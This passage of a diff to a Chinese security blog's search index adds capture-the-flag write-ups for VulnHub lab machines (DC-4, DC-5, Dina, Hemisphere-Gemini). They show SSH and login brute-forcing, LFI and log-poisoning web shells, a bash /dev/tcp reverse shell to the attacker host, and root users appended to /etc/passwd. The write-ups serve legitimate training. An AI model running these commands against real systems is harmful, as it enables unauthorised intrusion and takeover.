-<h2 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h2><p>（靶机有些简单，但也要把步骤明确好，勿喷勿喷）<br>第一种思路：<br>观察一下url<br>Sobre nosotros<br><img src="/2021/12/01/%E9%9D%B6%E6%9C%BAHemisphere-Gemini%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/17.png"><br>Contacto<br><img src="/2021/12/01/%E9%9D%B6%E6%9C%BAHemisphere-Gemini%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/18.png"><br>url后面的参数是view=文件 感觉可能是cat xxx<br>可能存在存在本地文件注入 (LFI)漏洞<br>手动测试了两下，果然！<br><img src="/2021/12/01/%E9%9D%B6%E6%9C%BAHemisphere-Gemini%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/9.png"><br>看到了一个名字叫wlliam的普通用户，尝试了几个默认的文件目录，找到了ssh备份文件<br><img src="/2021/12/01/%E9%9D%B6%E6%9C%BAHemisphere-Gemini%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/10.png"><br>好，上kali!<br>把id_rsa的内容保存在一个文件里，然后修改权限为600<br>这样就可以ssh链接了<br><img src="/2021/12/01/%E9%9D%B6%E6%9C%BAHemisphere-Gemini%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/11.png"><br>查看user.txt 获得第一个flag<br><img src="/2021/12/01/%E9%9D%B6%E6%9C%BAHemisphere-Gemini%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/12.png"></p>
-<p>第二种思路：<br>之前nmap搜集到了smb服务的信息<br>接着信息搜集</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">enum4linux 192.168.155.163</span><br></pre></td></tr></table></figure>
-<p>扫描后得到了一个名为william的账户<br>smb服务是开放的，我们还可以趁着这个机会去爆破密码<br>（这是第二种思路，放在此处仅仅为了提供一种思路）</p>
-<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>接下来就要提权了</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
-<p><img src="/2021/12/01/%E9%9D%B6%E6%9C%BAHemisphere-Gemini%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/13.png"><br>/etc/passwd倒是第一次见，看一下权限<br><img src="/2021/12/01/%E9%9D%B6%E6%9C%BAHemisphere-Gemini%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/14.png"><br>所有用户都有读写执行权限，那我们可以生成一个用户密码写入/etc/passwd</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">openssl passwd -1 -salt reigniting 123456</span><br><span class="line"></span><br><span class="line">echo &#x27;reigniting:$1$reigniti$xfzUaIQTdvQl8beISQhxk/:0:0:reigniting:/home/reigniting:/bin/bash&#x27; &gt;&gt; /etc/passwd</span><br></pre></td></tr></table></figure>
-<p><img src="/2021/12/01/%E9%9D%B6%E6%9C%BAHemisphere-Gemini%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/15.png"><br>用户添加成功，接着<code>su reigniting</code><br><img src="/2021/12/01/%E9%9D%B6%E6%9C%BAHemisphere-Gemini%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/16.png"><br>提权成功，获得第二flag<br>至此，渗透结束</p>
+<p><img src="/2021/07/02/%E9%9D%B6%E6%9C%BADC-4%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/2.png"></p>
+<span id="more"></span>
+<p><img src="/2021/07/02/%E9%9D%B6%E6%9C%BADC-4%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/3.png"><br>确定好ip之后，上namp扫描主机</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sS -sV -A -Pn -n -p- 192.168.55.136</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/07/02/%E9%9D%B6%E6%9C%BADC-4%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/4.png"></p>
+<h2 id="Burp-Suite爆破登录"><a href="#Burp-Suite爆破登录" class="headerlink" title="Burp Suite爆破登录"></a>Burp Suite爆破登录</h2><p>发现ssh和web开着，先去网页那里看一下<br><img src="/2021/07/02/%E9%9D%B6%E6%9C%BADC-4%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/5.png"><br>很简单的一个登录界面<br>这里尝试用Burp Suite进行爆破 先开代理抓包<br><img src="/2021/07/02/%E9%9D%B6%E6%9C%BADC-4%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/6.png"><br>可以发现里面的password密码没有加过密，也没有验证码，那就开始爆破！<br>发送到intruder 在password那里添加爆破点 模式设置为spider（狙击手）<br><img src="/2021/07/02/%E9%9D%B6%E6%9C%BADC-4%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/7.png"><br>position里选择Runtime file（运行时文件） 然后start attack<br><img src="/2021/07/02/%E9%9D%B6%E6%9C%BADC-4%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/8.png"><br>发现有一个和别的长度都不一样 于是用happy登录<br><img src="/2021/07/02/%E9%9D%B6%E6%9C%BADC-4%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/9.png"><br>成功了！</p>
+<h2 id="任意命令执行"><a href="#任意命令执行" class="headerlink" title="任意命令执行"></a>任意命令执行</h2><p><img src="/2021/07/02/%E9%9D%B6%E6%9C%BADC-4%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/10.png"><br>打开点了点，没发现什么有趣的东西。<br><img src="/2021/07/02/%E9%9D%B6%E6%9C%BADC-4%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/11.png"><br><img src="/2021/07/02/%E9%9D%B6%E6%9C%BADC-4%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/12.png"><br><img src="/2021/07/02/%E9%9D%B6%E6%9C%BADC-4%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/13.png"><br>抓包看看有什么东西吧<br><img src="/2021/07/02/%E9%9D%B6%E6%9C%BADC-4%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/14.png"><br>提交的信息是ls -l，感觉会是一处命令执行<br>查看一下配置信息，发现有3个账户，一会应该有用</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /etc/passwd</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/07/02/%E9%9D%B6%E6%9C%BADC-4%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/15.png"><br>讲道理，这里发现命令执行之后应该打反弹shell，但是我这不知道为啥一直不成，没办法只能另想办法了<br>又慢慢看了一些目录，发现有一个地方藏着一份密码字典。别问我怎么知道的，因为别的两个用户都没那个文件夹。<br><img src="/2021/07/02/%E9%9D%B6%E6%9C%BADC-4%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/16.png"><br><img src="/2021/07/02/%E9%9D%B6%E6%9C%BADC-4%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/17.png"><br><img src="/2021/07/02/%E9%9D%B6%E6%9C%BADC-4%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/18.png"></p>
+<h2 id="利用hydra进行ssh密码爆破"><a href="#利用hydra进行ssh密码爆破" class="headerlink" title="利用hydra进行ssh密码爆破"></a>利用hydra进行ssh密码爆破</h2><p>那接下来思路就很明了了，爆破ssh密码即可<br>这里就要上kali内置的爆破神器hydra了 因为密码字典是在jim那里发现的，爆破用户Jim即可</p>
+<blockquote>
+<p>hydra的使用 <a href="https://www.cnblogs.com/cowherd/p/13297837.html">https://www.cnblogs.com/cowherd/p/13297837.html</a><br><img src="/2021/07/02/%E9%9D%B6%E6%9C%BADC-4%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/19.png"></p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hydra -L dc4user.txt -P dc4.txt 192.168.55.136 -t 20 ssh </span><br></pre></td></tr></table></figure>
+<p>爆破成功，得到密码，shh进行连接。<br><img src="/2021/07/02/%E9%9D%B6%E6%9C%BADC-4%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/20.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh jim@192.168.55.136     #password:jibril04</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/07/02/%E9%9D%B6%E6%9C%BADC-4%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/21.png"><br>简单看一下，发现有个mail 打开发现是一个测试邮件<br><img src="/2021/07/02/%E9%9D%B6%E6%9C%BADC-4%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/22.png"><br>这应该是一个小hint，一般邮件的目录在/var/mail，于是去进入该目录<br><img src="/2021/07/02/%E9%9D%B6%E6%9C%BADC-4%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/23.png"><br>好家伙 密码就这么给了 那直接去登charles咯</p>
+<h2 id="切换到用户charles进行渗透"><a href="#切换到用户charles进行渗透" class="headerlink" title="切换到用户charles进行渗透"></a>切换到用户charles进行渗透</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh charles@192.168.55.136     #password:^xHhA&amp;hvim0y</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/07/02/%E9%9D%B6%E6%9C%BADC-4%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/24.png"><br>同样的流程也在这里走一遍，看看会不会有新的发现。想查看邮件的时候发现我们没有权限<br><img src="/2021/07/02/%E9%9D%B6%E6%9C%BADC-4%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/25.png"><br>应该是需要提权了</p>
+<h2 id="teehee提权"><a href="#teehee提权" class="headerlink" title="teehee提权"></a>teehee提权</h2><p>先查看拥有哪些权限</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo -l</span><br><span class="line">![](26.png)</span><br></pre></td></tr></table></figure>
+<p>发现可以免密码执行<br>提供了teehee命令，查看一下使用手册之后尝试一下写入文件内容进行提权</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo teehee -a /etc/passwd</span><br><span class="line">a::0:0:root:/root:/bin/bash</span><br></pre></td></tr></table></figure>
+<p>写入一个有root权限的用户 并切换成用户</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">su a</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/07/02/%E9%9D%B6%E6%9C%BADC-4%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/27.png"><br>ls查看目录后发现有个flag文件<br>打开，获得flag，渗透结束。<br><img src="/2021/07/02/%E9%9D%B6%E6%9C%BADC-4%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/28.png"></p>
+<hr>
+<p>这次渗透也学到了很多东西。<br>任意命令执行的掌握又加了一些<br>了解了一些/var存放的一些配置文件<br>用teehee提权写入一个root用户<br>熟练的点开搜索引擎（）<br>反正收获蛮多的~</p>
 <hr>
 <blockquote>
-<p>落去君休惜，飞来我自知。<br>莺愁蝶倦晚芳时，纵是明春再见隔年期。</p>
+<p>追逐影子的人，自己就是影子</p>
 </blockquote>
 <hr>
 ]]></content>
@@ -835,6 +1097,115 @@
 <hr>
 <blockquote>
 <p>何必喜一时得意，何必悲一时败挫。</p>
+</blockquote>
+<hr>
+]]></content>
+      <categories>
+        <category>靶机渗透记录</category>
+      </categories>
+      <tags>
+        <tag>靶机渗透记录</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>靶机DC-5的渗透记录</title>
+    <url>/2021/07/04/%E9%9D%B6%E6%9C%BADC-5%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/</url>
+    <content><![CDATA[<p>【未完成，以我现在的水平后半部分解决不了，随缘填坑更新】<br>重保期间，在学校当义工。除了盯着屏幕发呆，也没别的事。于是尝试通过靶机渗透学点东西。<br>顺便发现了靶机作者的个人主页。等DC系列结束之后就去尝试一下新系列（挖坑ing）</p>
+<blockquote>
+<p>下载地址：<a href="https://www.vulnhub.com/entry/dc-5,314/">https://www.vulnhub.com/entry/dc-5,314/</a></p>
+</blockquote>
+<h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><p>渗透机×1 kali2021<br>靶机DC-5×1  网络连接模式：NAT模式<br>老生常谈——所有引擎</p>
+<h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p><img src="/2021/07/04/%E9%9D%B6%E6%9C%BADC-5%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/1.png"></p>
+<span id="more"></span>
+<p>扫描内网</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">arp-scan -l</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/07/04/%E9%9D%B6%E6%9C%BADC-5%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/2.png"><br>通过mac地址确定靶机后上nmap</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sS -sV -A -Pn -n -p- 192.168.55.139</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/07/04/%E9%9D%B6%E6%9C%BADC-5%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/3.png"><br>80端口开着，去访问一下</p>
+<h2 id="利用文件包含漏洞打nc反弹shell"><a href="#利用文件包含漏洞打nc反弹shell" class="headerlink" title="利用文件包含漏洞打nc反弹shell"></a>利用文件包含漏洞打nc反弹shell</h2><p><img src="/2021/07/04/%E9%9D%B6%E6%9C%BADC-5%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/4.png"><br>在Contact下面发现了提交表格，那么我们的注意力就要放在这里了<br><img src="/2021/07/04/%E9%9D%B6%E6%9C%BADC-5%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/5.png"><br>随便提交了几回发现了一些问题 提交的内容会直接呈现在url里<br><img src="/2021/07/04/%E9%9D%B6%E6%9C%BADC-5%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/6.png"><br>不仅如此 这时间也有些问题<br><img src="/2021/07/04/%E9%9D%B6%E6%9C%BADC-5%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/7.png"><br><img src="/2021/07/04/%E9%9D%B6%E6%9C%BADC-5%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/8.png"><br><img src="/2021/07/04/%E9%9D%B6%E6%9C%BADC-5%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/9.png"><br>查看源码，发现了footer.php 于是去访问了一下<br><img src="/2021/07/04/%E9%9D%B6%E6%9C%BADC-5%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/10.png"><br><img src="/2021/07/04/%E9%9D%B6%E6%9C%BADC-5%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/11.png"><br><img src="/2021/07/04/%E9%9D%B6%E6%9C%BADC-5%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/12.png"><br>看样子应该是一处漏洞呀在thankuyou.php上也出现了这个问题<br>大概率是存在文件包含漏洞了<br>【这里其实一开始没注意到，后来发现了作者的个人主页，上面给了点小hint】</p>
+<blockquote>
+<p>作者five86的个人主页&gt; <a href="https://www.five86.com/dc-5.html">https://www.five86.com/dc-5.html</a></p>
+</blockquote>
+<p>访问url/thankyou.php?file=/etc/passwd<br><img src="/2021/07/04/%E9%9D%B6%E6%9C%BADC-5%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/13.png"><br><img src="/2021/07/04/%E9%9D%B6%E6%9C%BADC-5%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/14.png"><br>果然存在！ 至于我怎么知道的嘛……感觉+试出来的 这里其实可以考虑用Burp Suite或者Wfuzz遍历枚举一下<br>但是考虑只是个靶机 就试着摸了几下 一个靶机而已干嘛这么麻烦（）<br>根据之前的经验，我们已经知道这是Nginx服务器。在网站上的每一步操作都将会被写入日志文件log内，因此我们可以在这里尝试拿 shell<br>插一嘴，还可以使用Wappalyzer插件进行信息收集<br><img src="/2021/07/04/%E9%9D%B6%E6%9C%BADC-5%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/15.png"><br>先写进去个phpinfo()看一下<br><img src="/2021/07/04/%E9%9D%B6%E6%9C%BADC-5%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/16.png"><br><img src="/2021/07/04/%E9%9D%B6%E6%9C%BADC-5%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/17.png"><br>看来是可以的，那就直接写入一句话<br><img src="/2021/07/04/%E9%9D%B6%E6%9C%BADC-5%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/18.png"><br>开始打反弹shell 开启端口</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvvp 7777</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/07/04/%E9%9D%B6%E6%9C%BADC-5%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/19.png"><br>转换为交互式shell</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/07/04/%E9%9D%B6%E6%9C%BADC-5%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/20.png"></p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+<p>这个命令可以查找需要root权限才可运行的文件<br><img src="/2021/07/04/%E9%9D%B6%E6%9C%BADC-5%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/21.png"><br>用searchsploit命令搜索screen-4.5.0<br><img src="/2021/07/04/%E9%9D%B6%E6%9C%BADC-5%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/22.png"><br>【利用不成功，我不会了。网上看了看别人写的发现还需要编译。对于我这个菜鸟来说实属超纲，先放一放吧，以后水平提升在转过头来解决掉。】</p>
+<hr>
+<blockquote>
+<p>鲤鱼不跃，岂可成龙？大鹏驻足，焉能腾空？人生能有几回搏，此时不搏何时搏？</p>
+</blockquote>
+<hr>
+]]></content>
+      <categories>
+        <category>靶机渗透记录</category>
+      </categories>
+      <tags>
+        <tag>靶机渗透记录</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>靶机Dina: 1.0.1渗透记录</title>
+    <url>/2021/08/08/%E9%9D%B6%E6%9C%BADina-1-0-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/</url>
+    <content><![CDATA[<blockquote>
+<p>下载地址：<a href="https://www.vulnhub.com/entry/dina-101,200/">https://www.vulnhub.com/entry/dina-101,200/</a></p>
+</blockquote>
+<hr>
+<h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><p>靶机Dina: 1.0.1×1  NAT模式<br>渗透机kali 2021.2×1 和靶机在同一网段</p>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>打开靶机<br><img src="/2021/08/08/%E9%9D%B6%E6%9C%BADina-1-0-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/1.png"><br>看一下mac地址<br><img src="/2021/08/08/%E9%9D%B6%E6%9C%BADina-1-0-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/2.png"><br>扫描内网</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">arp-scan -l</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/08/08/%E9%9D%B6%E6%9C%BADina-1-0-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/3.png"><br>确定ip之后用namp扫描一下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sS -sV -A -Pn -n -p- 192.168.55.142</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/08/08/%E9%9D%B6%E6%9C%BADina-1-0-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/4.png"></p>
+<span id="more"></span>
+<p>老规矩，先去看一下网页<br><img src="/2021/08/08/%E9%9D%B6%E6%9C%BADina-1-0-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/5.png"><br>没啥东西，扫描一下目录</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gobuster dir -u http://192.168.55.142/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/08/08/%E9%9D%B6%E6%9C%BADina-1-0-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/6.png"><br>扫到了一些目录，挨个访问看一下<br>/secure看到一个压缩包，先下载下来看看<br><img src="/2021/08/08/%E9%9D%B6%E6%9C%BADina-1-0-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/7.png"><br>/nothing 的网页源码看到了隐藏的信息，应该是一份小的密码字典<br><img src="/2021/08/08/%E9%9D%B6%E6%9C%BADina-1-0-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/8.png"><br>之前那个压缩包需要密码 密码就在字典里面，解开后是一个mp3，然而打不开。打开010 editor可以发现是个文档，并且记录了后台登录的地址和用户名<br><img src="/2021/08/08/%E9%9D%B6%E6%9C%BADina-1-0-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/9.png"><br>转到后台登录的界面，是一个CMS<br><img src="/2021/08/08/%E9%9D%B6%E6%9C%BADina-1-0-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/10.png"><br>密码字典的diana是密码，进去之后开始渗透测试<br><img src="/2021/08/08/%E9%9D%B6%E6%9C%BADina-1-0-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/11.png"></p>
+<h2 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h2><p>一开始想直接msf懒省事，但是我的shell不能用，一直提醒报错就很烦。<br>搜索引擎上找到了跟这个CMS相关的命令执行漏洞，根据说明来尝试一下<br>先创建一个csv文件<br><img src="/2021/08/08/%E9%9D%B6%E6%9C%BADina-1-0-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/12.png"><br>写入文档给的一句话，要加上一些信息，不然过不去。<br><img src="/2021/08/08/%E9%9D%B6%E6%9C%BADina-1-0-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/13.png"><br>打开Burp Suite拦包<br>上传文件<br><img src="/2021/08/08/%E9%9D%B6%E6%9C%BADina-1-0-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/14.png"><br><img src="/2021/08/08/%E9%9D%B6%E6%9C%BADina-1-0-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/15.png"><br>在文件头那里改成cat /etc/passwd<br>forward放包后看一下网页<br><img src="/2021/08/08/%E9%9D%B6%E6%9C%BADina-1-0-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/16.png"><br>可行，那直接把内容改成反弹shell去连接渗透机kali</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo ‘bash -i&gt;&amp;/dev/tcp/192.168.55.128/2333 0&gt;&amp;1’ | bash</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/08/08/%E9%9D%B6%E6%9C%BADina-1-0-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/17.png"><br>连接成功</p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>直接sudo -l<br><img src="/2021/08/08/%E9%9D%B6%E6%9C%BADina-1-0-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/18.png"><br>/usr/bin/perl在运行的时候拥有root权限且不需要密码<br>利用perl进行反弹shell<br><img src="/2021/08/08/%E9%9D%B6%E6%9C%BADina-1-0-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/19.png"><br>获取到了root权限，提权成功<br>读取flag<br><img src="/2021/08/08/%E9%9D%B6%E6%9C%BADina-1-0-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/20.png"><br>至此，渗透结束。</p>
+<hr>
+<blockquote>
+<p>在哪里存在,就在哪里绽放。不要因为难过,就忘了散发芳香。</p>
+</blockquote>
+<hr>
+]]></content>
+      <categories>
+        <category>靶机渗透记录</category>
+      </categories>
+      <tags>
+        <tag>靶机渗透记录</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>靶机Hemisphere-Gemini渗透记录</title>
+    <url>/2021/12/01/%E9%9D%B6%E6%9C%BAHemisphere-Gemini%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/</url>
+    <content><![CDATA[<h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><p>靶机Hemisphere-Gemini×1<br>渗透机kali 2021.2×1 和靶机在同一网段<br>如果网卡不一致还需要先改一下靶机网卡<br>靶机很简单很简单，放轻松~</p>
+<h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>打开靶机<br><img src="/2021/12/01/%E9%9D%B6%E6%9C%BAHemisphere-Gemini%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/1.png"><br>老规矩，首先要确定靶机ip。先看mac地址是多少</p>
+<span id="more"></span>
+
+<p><img src="/2021/12/01/%E9%9D%B6%E6%9C%BAHemisphere-Gemini%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/2.png"><br>然后扫描确定ip</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">arp-scan -l</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/12/01/%E9%9D%B6%E6%9C%BAHemisphere-Gemini%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/3.png"><br>确定ip之后用nmap进行更深层次的信息探测</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sS -sV -A -Pn -n -p- 192.168.155.163</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/12/01/%E9%9D%B6%E6%9C%BAHemisphere-Gemini%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/5.png"><br><img src="/2021/12/01/%E9%9D%B6%E6%9C%BAHemisphere-Gemini%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/6.png"><br>80端口开着，可以先访问一下网页<br><img src="/2021/12/01/%E9%9D%B6%E6%9C%BAHemisphere-Gemini%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/4.png"><br>点了点没什么东西，那就在扫一下目录</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gobuster dir -u  http://192.168.155.163/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/12/01/%E9%9D%B6%E6%9C%BAHemisphere-Gemini%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/7.png"><br>访问/Portal 又是一个页面，先点点<br><img src="/2021/12/01/%E9%9D%B6%E6%9C%BAHemisphere-Gemini%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/8.png"></p>
+<h2 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h2><p>（靶机有些简单，但也要把步骤明确好，勿喷勿喷）<br>第一种思路：<br>观察一下url<br>Sobre nosotros<br><img src="/2021/12/01/%E9%9D%B6%E6%9C%BAHemisphere-Gemini%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/17.png"><br>Contacto<br><img src="/2021/12/01/%E9%9D%B6%E6%9C%BAHemisphere-Gemini%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/18.png"><br>url后面的参数是view=文件 感觉可能是cat xxx<br>可能存在存在本地文件注入 (LFI)漏洞<br>手动测试了两下，果然！<br><img src="/2021/12/01/%E9%9D%B6%E6%9C%BAHemisphere-Gemini%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/9.png"><br>看到了一个名字叫wlliam的普通用户，尝试了几个默认的文件目录，找到了ssh备份文件<br><img src="/2021/12/01/%E9%9D%B6%E6%9C%BAHemisphere-Gemini%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/10.png"><br>好，上kali!<br>把id_rsa的内容保存在一个文件里，然后修改权限为600<br>这样就可以ssh链接了<br><img src="/2021/12/01/%E9%9D%B6%E6%9C%BAHemisphere-Gemini%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/11.png"><br>查看user.txt 获得第一个flag<br><img 